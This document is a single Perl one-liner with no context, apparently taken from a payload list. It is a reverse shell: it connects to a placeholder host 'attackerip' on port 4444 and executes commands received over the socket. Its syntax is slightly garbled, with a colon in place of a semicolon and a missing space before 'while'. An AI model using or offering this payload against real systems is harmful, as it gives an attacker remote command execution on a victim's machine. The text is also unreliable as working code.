perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444"):STDIN->fdopen($c,r);$~->fdopen($c,w);system$_while<>;'
